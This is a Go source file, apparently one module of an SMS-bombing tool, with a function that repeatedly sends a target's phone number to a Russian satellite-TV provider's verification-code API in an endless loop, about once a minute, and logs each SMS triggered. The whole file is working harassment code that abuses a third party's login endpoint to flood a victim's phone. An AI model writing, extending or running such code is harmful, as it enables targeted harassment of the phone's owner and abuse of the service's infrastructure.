package main

import (
	"time"

	"github.com/valyala/fasthttp"
)

func viasat() {
	req := newreq()
	req.SetBodyString(`{"msisdn":"+` + num + `"}`)
	req.Header.SetContentType("application/json")
	req.SetRequestURI("https://api-production.viasat.ru/api/v1/auth_codes")
	req.Header.SetMethod("POST")

	timeout := time.Minute + time.Second*2
	if logging > 0 {
		var err error
		res := &fasthttp.Response{}

		for do {
			err = client.Do(req, res)

			if err == nil && res.StatusCode() == 204 {
				okLog(smsLog)
			} else {
				errLog(smsLog)
			}
			time.Sleep(timeout)
		}
	} else {
		for do {
			client.Do(req, nil)
			time.Sleep(timeout)
		}
	}
}
